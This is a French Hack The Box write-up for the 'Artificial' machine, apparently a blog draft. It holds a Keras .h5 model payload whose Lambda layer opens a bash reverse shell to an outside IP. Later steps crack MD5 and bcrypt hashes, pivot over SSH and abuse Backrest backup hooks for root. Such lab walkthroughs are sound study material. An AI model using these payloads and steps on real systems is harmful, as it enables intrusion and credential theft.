+++
draft = true
date = '2025-10-07T15:00:00+02:00'
title = "Hack The Box Artificial"
description = "Write Up du challenge Artificial"
authors = "Wanako"
tags = ["Hack The Box"]
categories = ["Machine", "Hack The Box", "CVE"]
+++

# WriteUp - Artificial 

## Reconnaissance

```bash
nmap -A [IP]
```

**Ports ouverts :**
- **22/tcp** : SSH (OpenSSH 8.2p1)
- **80/tcp** : HTTP (nginx 1.18.0) → Redirection vers `http://artificial.htb/`

**Enumération web :**
```bash
gobuster dir -w directory-list-2.3-small.txt -u http://artificial.htb/ -x php,html,js
```

**Pages découvertes :**
- `/login` (200)
- `/register` (200)
- `/logout` (302)
- `/dashboard` (302 → /login)

---

## Exploitation - Upload de modèle malveillant (.h5)

### 1. Analyse de la fonctionnalité
Après création d'un compte, la plateforme permet l'upload de fichiers `.h5` (modèles Keras/TensorFlow).

### 2. Création du payload malveillant

**Script Python d'exploitation :**
```python
import tensorflow as tf

model = tf.keras.Sequential([
    tf.keras.layers.Input(shape=(10,)),
    tf.keras.layers.Lambda(lambda x: __import__('os').system(
        'bash -c "bash -i >& /dev/tcp/10.10.14.115/4444 0>&1"'
    ))
])

model.save('exploit.h5')
```

**Vulnérabilité exploitée :**
- **CVE-2023-33976** : TensorFlow < 2.14 exécute du code arbitraire lors de la désérialisation de Lambda layers
- Pas de sanitization lors du `load_model()`

**Build du modèle :**
```bash
docker build -t tf-exploit .
docker run -it -v $(pwd):/code tf-exploit
python3 create_exploit.py
```

### 3. Obtention du shell

**Listener :**
```bash
nc -lvnp 4444
```

**Upload de `exploit.h5`** → Shell reçu en tant qu'utilisateur `app`

---

## Escalade de privilèges #1 - Utilisateur gael

### 1. Extraction des credentials

```bash
cat instance/users.db
```

**Hash MD5 de gael :**
```
c99175974b6e192936d97224638a34f8
```

**Crackage via CrackStation :**
```
c99175974b6e192936d97224638a34f8 → mattp005numbertwo
```

### 2. Connexion SSH

```bash
ssh gael@10.10.11.74
# Password: mattp005numbertwo
```

**Vérification des groupes :**
```bash
id
# uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
```

---

## Escalade de privilèges #2 - Root via Backrest

### 1. Recherche de fichiers accessibles au groupe sysadm

```bash
find / -group sysadm 2>/dev/null
# /var/backups/backrest_backup.tar.gz
```

### 2. Extraction du backup

```bash
cp /var/backups/backrest_backup.tar.gz /tmp/
cd /tmp
tar xvf backrest_backup.tar.gz
```

**Contenu découvert :**
```json
{
  "name": "backrest_root",
  "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
}
```

### 3. Crackage du hash bcrypt

```bash
echo "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP" | base64 -d
# $2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
```

```bash
hashcat -m 3200 hash.txt rockyou.txt --force
# Password: !@#$%^
```

### 4. Port Forwarding vers Backrest (port 9898)

```bash
ssh -L 9898:127.0.0.1:9898 gael@10.10.11.74
```

Accès à l'interface Backrest via `http://localhost:9898`

### 5. Exploitation de Backrest pour Command Injection

**Étapes :**

1. **Créer un nouveau Repository Restic**
   - Path: `/tmp`

2. **Ajouter un Hook**
   - Command: `cat /root/root.txt`
   - Type: After Backup

3. **Créer un Plan de Backup**
   - Repository: celui créé précédemment
   - Path: `/root`

4. **Exécuter le Backup**
   - Cliquer sur "Backup Now"

5. **Récupérer le flag**
   - Consulter "Hook Output" :

```
1f0414629075d2d1373c2db0aea61ca3
```

---

## Résumé de la chaîne d'exploitation

```
1. Upload .h5 malveillant (RCE via Lambda layer)
   ↓
2. Shell en tant que 'app'
   ↓
3. Extraction de users.db → Hash MD5 de gael
   ↓
4. Crack du hash → SSH avec gael
   ↓
5. Groupe sysadm → Accès à backup Backrest
   ↓
6. Crack du bcrypt → Credentials admin Backrest
   ↓
7. Port forwarding + Command Injection via Hooks
   ↓
8. Root flag: 1f0414629075d2d1373c2db0aea61ca3
```

---

## Points clés

- **CVE TensorFlow** : Désérialisation non sécurisée de Lambda layers
- **Credential reuse** : Hash faibles (MD5, bcrypt avec rockyou)
- **Privilege Escalation** : Exploitation de groupes Unix (sysadm)
- **Pivoting** : Port forwarding SSH pour accéder à un service interne
- **Command Injection** : Abus de fonctionnalité légitime (Hooks de backup)
